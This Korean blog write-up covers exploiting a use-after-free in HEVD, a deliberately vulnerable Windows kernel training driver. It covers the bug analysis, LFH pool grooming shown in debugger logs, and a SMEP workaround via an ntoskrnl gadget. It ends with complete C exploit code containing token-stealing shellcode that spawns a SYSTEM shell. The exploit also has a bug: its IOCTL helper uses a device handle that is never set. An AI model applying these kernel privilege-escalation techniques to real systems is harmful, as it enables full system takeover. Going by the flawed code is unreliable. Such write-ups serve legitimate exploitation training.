---
title: "[HEVD] Use UAF Object NonPagedPool"
categories: [Windows Kernel]
---

## 1. Vulnerability Research

환경 : Win11 22H2

```c
__int64 __fastcall AllocateUaFObjectNonPagedPool()
  {
    const void **PoolWithTag; // rdi

    DbgPrintEx(0x4Du, 3u, "[+] Allocating UaF Object\n");
    PoolWithTag = (const void **)ExAllocatePoolWithTag(NonPagedPool, 0x60uLL, 0x6B636148u);
    if ( PoolWithTag )
    {
      DbgPrintEx(0x4Du, 3u, "[+] Pool Tag: %s\n", "'kcaH'");
      DbgPrintEx(0x4Du, 3u, "[+] Pool Type: %s\n", "NonPagedPool");
      DbgPrintEx(0x4Du, 3u, "[+] Pool Size: 0x%zX\n", 0x60uLL);
      DbgPrintEx(0x4Du, 3u, "[+] Pool Chunk: 0x%p\n", PoolWithTag);
      memset(PoolWithTag + 1, 65, 0x54uLL);
      *((_BYTE *)PoolWithTag + 91) = 0;
      *PoolWithTag = UaFObjectCallbackNonPagedPool;
      g_UseAfterFreeObjectNonPagedPool = PoolWithTag;
      DbgPrintEx(0x4Du, 3u, "[+] UseAfterFree Object: 0x%p\n", PoolWithTag);
      DbgPrintEx(0x4Du, 3u, "[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
      DbgPrintEx(0x4Du, 3u, "[+] UseAfterFree->Callback: 0x%p\n", *PoolWithTag);
      return 0LL;
    }
    else
    {
      DbgPrintEx(0x4Du, 3u, "[-] Unable to allocate Pool chunk\n");
      return 3221225495LL;
    }
  }

  __int64 __fastcall FreeUaFObjectNonPagedPool()
  {
    unsigned int v0; // ebx

    v0 = -1073741823;
    if ( g_UseAfterFreeObjectNonPagedPool )
    {
      DbgPrintEx(0x4Du, 3u, "[+] Freeing UaF Object\n");
      DbgPrintEx(0x4Du, 3u, "[+] Pool Tag: %s\n", "'kcaH'");
      DbgPrintEx(0x4Du, 3u, "[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
      ExFreePoolWithTag(g_UseAfterFreeObjectNonPagedPool, 0x6B636148u);
      // g_UseAfterFreeObjectNonPagedPool = NULL;   <-- 누락. 전역 포인터가 해제된 청크를 계속 가리킨다
      return 0;
    }
    return v0;
  }

  __int64 __fastcall UseUaFObjectNonPagedPool()
  {
    unsigned int v0; // ebx

    v0 = -1073741823;
    if ( g_UseAfterFreeObjectNonPagedPool )
    {
      DbgPrintEx(0x4Du, 3u, "[+] Using UaF Object\n");
      DbgPrintEx(0x4Du, 3u, "[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
      DbgPrintEx(
        0x4Du,
        3u,
        "[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n",
        *(const void **)g_UseAfterFreeObjectNonPagedPool);
      DbgPrintEx(0x4Du, 3u, "[+] Calling Callback\n");
      if ( *(_QWORD *)g_UseAfterFreeObjectNonPagedPool )
        (*(void (**)(void))g_UseAfterFreeObjectNonPagedPool)();   // 해제된 메모리에서 읽은 함수 포인터를 호출
      return 0;
    }
    return v0;
  }
```

1. FreeUaFObjectNonPagedPool이 객체를 해제한 뒤 전역 포인터인 g_UseAfterFreeObjectNonPagedPool을 NULL로 덮지 않아 dangling pointer가 남음.
2. UseUaFObjectNonPagedPool이 그 포인터를 역참조해 이미 해제된 메모리에서 함수 포인터를 읽어서 호출함.

---

## 2. Attack Scenario

### 재점유 프리미티브

UAF 익스플로잇의 핵심은 해제된 청크를 공격자가 제어하는 데이터로 다시 채우는 것임.
HEVD 는 이 목적에 그대로 쓸 수 있는 IOCTL 을 제공함.

| IOCTL    | 핸들러                         | 역할                          |
| -------- | ------------------------------ | ----------------------------- |
| 0x222013 | AllocateUaFObjectNonPagedPool  | UaF 객체 할당 (0x60)          |
| 0x22201B | FreeUaFObjectNonPagedPool      | 해제 (dangling 발생)          |
| 0x222017 | UseUaFObjectNonPagedPool       | Callback 호출 (트리거)        |
| 0x22201F | AllocateFakeObjectNonPagedPool | 0x5C 를 유저 버퍼로 채워 할당 |

    chunk = ExAllocatePoolWithTag(NonPagedPool, 0x5C, 'kcaH');
    ProbeForRead(UserFakeObject, 0x5C, 1);
    // 유저 버퍼 [0x00, 0x5C) 를 그대로 복사

UaF 객체는 0x60, Fake 객체는 0x5C 지만 POOL_HEADER(0x10) 를 포함하면 둘 다 0x70 으로 같은 사이즈 버킷에 속하고, 풀 타입과 태그도 동일함.
그리고 복사 범위가 offset 0 부터이므로 Callback 필드를 완전히 제어할 수 있음.

### 공격 흐름

1. 0x22201F를 반복 호출해 0x70 버킷을 LFH로 전환
2. 0x222013으로 UaF 객체 할당 -> LFH 슬롯에 배치
3. 0x22201B로 해제 -> 슬롯 반환 및 전역 포인터는 유지 시킴 (Dangling)
4. 0x22201F로 재점유 -> 해제된 슬롯을 페이로드가 차지
5. 0x222017로 트리거 -> call rcx가 심은 값을 호출

### RIP 제어 이후

call rcx로 임의 커널 주소로 분기할 수 있지만, SMEP 때문에 유저랜드 셸코드로는 분기할 수 없음. 하지만 이 문제에는 이 제약을 우회할 수 있는 조건이 존재함.

첫째, Use 핸들러의 코드를 보면

```nasm
mov  rax, cs:g_UseAfterFreeObjectNonPagedPool
mov  rcx, [rax]
call rcx
```

call 시점에 rax가 이미 우리가 제어하고 있는 청크의 주소를 담고 있으므로, 청크 주소를 알아내기 위한 정보 Leak이 필요하지 않음.

둘째, 이 챌린지가 사용하는 Pool_Type 0은 실행 권한이 있는 NonPagedPool로 매핑됨. 그렇기에 Fake 객체 안에 셸코드를 배치하면 그대로 실행할 수 있음.

따라서 Callback에 rax로 분기하는 가젯의 주소를 심으면 커널에서 셸코드를 실행할 수 있음.

---

## 3. Pool Grooming

### 첫 시도

1. 0x222013 UaF 객체 할당
2. 0x22201B 해제
3. 0x22201F Fake 객체 0x40개 Spray

이 시점에 전역 포인터가 가리키는 청크를 확인하면 재점유 성공 여부를 알 수 있음.

```
0: kd> lm m HEVD
fffff80063070000 fffff800630fd000   HEVD   (deferred)

0: kd> dq HEVD+0x84048 L1
fffff800630f4048  ffffb50a77769da0

0: kd> dq poi(HEVD+0x84048) L4
ffffb50a77769da0  fffff800630f8b20 4141414141414141 ffffb50a77769db0  4141414141414141 4141414141414141
```

전역 포인터가 NULL이 아니므로 Dangling은 확인됨. 그런데 청크 내용은 `fffff800630f8b20` = HEVD+0x88b20 = UaFObjectCallbackNonPagedPool, 즉 원본 콜백이 그대로 남아있음. 뒤에 0x41이 채워진 것도 AllocateUaFObject의 memset(obj+8, 0x41, 0x54) 흔적임.

Fake 객체 0x40개를 뿌렸는데 해제된 슬롯을 하나도 건드리지 않음을 확인할 수 있음.

### 관측 방법 설계

Fake 객체 페이로드에 두 가지 mark를 심어 구분 가능하게 만들었음.

```
+0x00  0x4141414141414141        Callback 자리 (실행되지 않게 non-canonical)
+0x08  0xC0DEC0DE_0000xxxx       몇 번째 스프레이가 슬롯을 먹었는지
나머지 0x42 로 채움                드라이버의 0x41 과 구분
```

필러를 0x42로 채움으로써 0x41이 보이면 원본 객체가 그대로 있다는 뜻이고, 0x42가 보이면 우리 객체로 교체됐다는 것을 확인할 수 있음.

### 원인 진단

Fake 객체가 실제로 어디에 떨어지는지 로깅을 해봤음.

```
0: kd> bp HEVD+0x88803 ".printf "fake %p\n", @rax; gc"
0: kd> g
fake ffffb50a777e41b0
fake ffffb50a777e4290
fake ffffb50a777e4a70
fake ffffb50a777e4450
fake ffffb50a777e4d80
fake ffffb50a777e4060
```

정렬해서 보면 두 가지 특징이 드러남.

1. 간격이 0x70의 배수임
2. 할당 순서와 주소 순서가 전혀 일치하지 않음.

LFH의 특징은 균일한 슬롯 격자와 무작위 슬롯 선택임. 하지만 해제된 UaF 청크가 있던 페이지에는 0xd80 크기의 CcBc 청크가 함께 존재했음. 크기가 섞인 페이지이므로 LFH 서브세그먼트가 아닌 VS임을 확인.

즉 문제는,

|           | 할당 성격 | 백엔드 | 위치           |
| --------- | --------- | ------ | -------------- |
| UaF 객체  | 단발 1회  | VS     | ...769da0      |
| Fake 객체 | 연속 다수 | LFH    | ...7e4000 대역 |

백엔드가 다르면 애초에 같은 슬롯을 공유할 수 없음.

### 해결

LFH 버킷은 같은 크기의 할당이 일정 개수 누적되면 활성화되고, 한 번 활성화되면 이후 그 크기의 할당은 계속 LFH에서 나옴.

첫 시도의 시간 순서를 보면 원인이 명확해짐.

```
1. UaF 객체 할당    <- 이 시점 0x70 누적 = 1개.  LFH 미활성 → VS
2. 해제
3. Fake × 0x40      <- 여기서 LFH 가 켜짐 → 다른 영역
```

그렇기에 UaF 객체가 할당되기 전에 LFH를 미리 활성화 시키는 것이 중요함.

```
1. Fake × 0x80      <- 워밍업. LFH 활성화
2. UaF 객체 할당    <- 이제 LFH 슬롯을 받음
3. 해제             <- LFH 빈 슬롯으로 반환
4. Fake × 0x40      <- 같은 서브세그먼트에서 그 슬롯을 회수
5. 트리거
```

### 검증

워밍업을 추가한 뒤 UaF 객체의 주소를 확인했음.

```
0: kd> bp HEVD+0x8895e ".printf "uaf %p\n", @rax; gc"
0: kd> g
uaf ffffb50a777e9530
```

`777exxxx` 대역이고 오프셋 0x530도 앞서 관측한 0x70 위에 있음. UaF 객체가 LFH로 들어왔음을 보여줌.

재점유 결과는 다음과 같음.

```
0: kd> dq poi(HEVD+0x84048) L4
ffffb50a777e9530  4141414141414141 c0dec0de00000000 ffffb50a777e9540  4242424242424242 4242424242424242
```

Callback은 우리가 심은 값, 필러는 0x42, marker는 `c0dec0de00000000`.
인덱스가 0이므로 해제 직후 첫 번째 Fake 객체가 그 슬롯을 회수했음.
LFH가 최근 해제된 슬롯을 즉시 반환하기 때문에 재점유는 거의 결정적이었음.

---

## 4. RIP to Code Execution

### RIP 제어 확인

재점유가 됐으므로 Callback 필드는 우리 것임. 실제로 호출되는지 확인.

```
1: kd> bp HEVD+0x88bba
1: kd> g
Breakpoint 0 hit
HEVD+0x88bba:
fffff800`630f8bba ffd1            call    rcx

1: kd> r rcx
rcx=4141414141414141

1: kd> r rax
rax=ffffb50a7cad97d0
```

rcx에 우리가 심은 값이 들어왔음. 그리고 이 명령은 kCFG 검사를 거치지 않는 간접 호출이므로 임의 커널 주소로 분기할 수 있음.

### 포인터가 코드로 읽혀야 하는 문제

문제는 `call rax`로 도착하는 지점이 청크의 offset 0 이라는 것임.
그 자리에는 우리가 심은 가젯 주소 8바이트가 들어있고, 그것이 그대로 명령어로 해석됨.

커널 주소를 리틀엔디언으로 늘어놓으면 이런 모양임.

```
주소 0xFFFFF800547E24EB
메모리 EB 24 7E 54 00 F8 FF FF
                      ^^^^^ ^^^^^
                      FF FF 는 x64 에서 유효하지 않은 opcode
```

뒤쪽 FF FF에서 #UD(Invalid Opcode)가 발생하므로 반드시 건너 뛰어야함.
EB는 short jmp opcode이므로, 주소의 하위 두 바이트가 그 역할을 할 수 있음.

```
EB 24  ->  jmp +0x24  ->  기준점 chunk+2, 착지 chunk+0x26
```

즉 가젯을 고르는 조건이 늘어남.

1. rax로 분기
2. 가젯 본문이 rax를 파괴하지 않음.
3. 주소의 최하위 바이트가 0xEB
4. 그 다음 바이트가 청크 내부를 가리키는 전방 점프 거리

### 최종 체인

```
      call rcx  ──▶  nt+0x3e24eb
                       cmc / mov / imul / add / mov      (rax 보존)
                     call rax
                       │
                       ▼
                chunk+0x00   EB 24 | 7E 54 00 F8 FF FF | CC CC ...
                             └jmp┘   └── 건너뛰어짐 ──┘
                       │
                       ▼
                chunk+0x26   셸코드
```

---

## 5. Exploit Code

```c
#include <windows.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL  IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL      IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL IOCTL(0x807)
#define HEVD_DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"

#define FAKE_OBJECT_SIZE 0x5C
#define WARMUP_SPRAY     0x80
#define SPRAY_COUNT      0x40
#define NT_GADGET_RVA    0x3e24eb

static const unsigned char g_shellcode[] = {
    0x65,0x48,0x8B,0x14,0x25,0x88,0x01,0x00,0x00,
    0x48,0x8B,0x92,0xB8,0x00,0x00,0x00,
    0x4C,0x8D,0x82,0x48,0x04,0x00,0x00,
    0x4C,0x89,0xC1,
    0x48,0x8B,0x09,
    0x83,0x79,0xF8,0x04,
    0x75,0xF7,
    0x48,0x8B,0x41,0x70,
    0x24,0xF0,
    0x49,0x89,0x40,0x70,
    0x48,0x83,0xC4,0x08,
    0xC3
};

static HANDLE g_hevd = INVALID_HANDLE_VALUE;

#define SystemModuleInformation 11

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} SYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION;

typedef NTSTATUS (WINAPI *PNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

static uintptr_t GetKernelModuleBase(const char *name)
{
    PNtQuerySystemInformation q = (PNtQuerySystemInformation)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!q) return 0;

    ULONG len = 0;
    q(SystemModuleInformation, NULL, 0, &len);
    if (!len) return 0;

    SYSTEM_MODULE_INFORMATION *info = (SYSTEM_MODULE_INFORMATION *)malloc(len);
    if (!info) return 0;

    uintptr_t base = 0;
    if (q(SystemModuleInformation, info, len, &len) >= 0) {
        for (ULONG i = 0; i < info->Count; i++) {
            const char *file = (const char *)info->Module[i].FullPathName
                             + info->Module[i].OffsetToFileName;
            if (_stricmp(file, name) == 0) {
                base = (uintptr_t)info->Module[i].ImageBase;
                break;
            }
        }
    }
    free(info);
    return base;
}

static int Ioctl(DWORD code, LPVOID in, DWORD inLen)
{
    DWORD ret = 0;
    return DeviceIoControl(g_hevd, code, in, inLen, NULL, 0, &ret, NULL) ? 1 : 0;
}

static int AllocUafObject(void) { return Ioctl(HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0); }
static int FreeUafObject(void)  { return Ioctl(HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0); }
static int UseUafObject(void)   { return Ioctl(HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0); }

static int AllocFakeObject(const unsigned char *payload)
{
    return Ioctl(HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,
                 (LPVOID)payload, FAKE_OBJECT_SIZE);
}

static int BuildPayload(unsigned char *buf, uintptr_t gadget)
{
    size_t off = 2 + (size_t)((gadget >> 8) & 0xFF);
    if ((gadget & 0xFF) != 0xEB) return 0;
    if (off < 8 || off + sizeof(g_shellcode) > FAKE_OBJECT_SIZE) return 0;

    memset(buf, 0xCC, FAKE_OBJECT_SIZE); // 0XCC == int 3 을 집어넣어서 쓰레기 명령 실행대신 BP 예외
    *(uint64_t *)(buf + 0x00) = (uint64_t)gadget;
    memcpy(buf + off, g_shellcode, sizeof(g_shellcode));
    return 1;
}

int main(void)
{
    unsigned char payload[FAKE_OBJECT_SIZE];

    uintptr_t nt = GetKernelModuleBase("ntoskrnl.exe");
    if (!nt) return 1;
    if (!BuildPayload(payload, nt + NT_GADGET_RVA)) return 1;

    HANDLE hDevice = CreateFileA(HEVD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) return 1;

    for (uint32_t i = 0; i < WARMUP_SPRAY; i++) //LFH 활성화
        if (!AllocFakeObject(payload)) return 1;

    if (!AllocUafObject()) return 1; //if 문 조건 판단 위에 항상 먼저 실행되고 결과 판단
    if (!FreeUafObject())  return 1;

    for (uint32_t i = 0; i < SPRAY_COUNT; i++)
        if (!AllocFakeObject(payload)) return 1;

    UseUafObject();

    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}

```
